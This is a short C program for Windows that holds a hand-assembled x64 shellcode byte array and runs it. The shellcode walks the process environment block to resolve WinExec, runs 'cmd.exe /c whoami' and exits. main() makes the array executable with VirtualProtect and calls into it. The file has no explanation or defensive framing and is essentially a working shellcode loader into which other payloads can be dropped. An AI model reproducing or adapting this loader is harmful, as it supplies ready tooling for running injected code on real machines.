#include <stdio.h>
#include <string.h>
#include <windows.h>

unsigned char shellcode[] = {
  0xeb, 0x66, 0x4d, 0x31, 0xc9, 0x44, 0x8b, 0x49, 0x3c, 0x49, 0x01, 0xc9,
  0x4d, 0x31, 0xdb, 0x49, 0x83, 0xc1, 0x78, 0x45, 0x8b, 0x59, 0x10, 0x49,
  0x01, 0xcb, 0x4d, 0x31, 0xc9, 0x45, 0x8b, 0x4b, 0x20, 0x49, 0x01, 0xc9,
  0x48, 0x31, 0xc0, 0x41, 0x8b, 0x43, 0x18, 0x49, 0x87, 0xca, 0xff, 0xc8,
  0x4c, 0x89, 0xc1, 0x48, 0x89, 0xd7, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x34,
  0x81, 0x4c, 0x01, 0xd6, 0xf3, 0xa6, 0x75, 0xea, 0x48, 0x31, 0xf6, 0x41,
  0x8b, 0x73, 0x24, 0x4c, 0x01, 0xd6, 0x48, 0x31, 0xd2, 0x66, 0x8b, 0x14,
  0x46, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x73, 0x1c, 0x4c, 0x01, 0xd6, 0x8b,
  0x14, 0x96, 0x4c, 0x01, 0xd2, 0x48, 0x92, 0xc3, 0x48, 0x83, 0xe4, 0xf0,
  0x4d, 0x31, 0xe4, 0x65, 0x49, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x5b,
  0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48,
  0x8b, 0x5b, 0x20, 0x4d, 0x31, 0xc0, 0x41, 0xb0, 0x07, 0xeb, 0x28, 0x5a,
  0x48, 0x89, 0xd9, 0xe8, 0x6a, 0xff, 0xff, 0xff, 0xeb, 0x29, 0x59, 0x48,
  0x31, 0xd2, 0x44, 0x88, 0x61, 0x11, 0xff, 0xd0, 0x41, 0xb0, 0x0b, 0xeb,
  0x31, 0x5a, 0x48, 0x89, 0xd9, 0xe8, 0x50, 0xff, 0xff, 0xff, 0x48, 0x31,
  0xc9, 0xff, 0xd0, 0xe8, 0xd3, 0xff, 0xff, 0xff, 0x57, 0x69, 0x6e, 0x45,
  0x78, 0x65, 0x63, 0xe8, 0xd2, 0xff, 0xff, 0xff, 0x63, 0x6d, 0x64, 0x2e,
  0x65, 0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x77, 0x68, 0x6f, 0x61, 0x6d,
  0x69, 0x30, 0xe8, 0xca, 0xff, 0xff, 0xff, 0x45, 0x78, 0x69, 0x74, 0x50,
  0x72, 0x6f, 0x63, 0x65, 0x73, 0x73
};

int main(void) {
  DWORD flag = 0;
  int len = strlen(shellcode);
  printf("[*] shellcode length: %d\n", len);
  VirtualProtect(shellcode, len, PAGE_EXECUTE_READWRITE, &flag);
  (*(void (*)())shellcode)();
  return 0;
}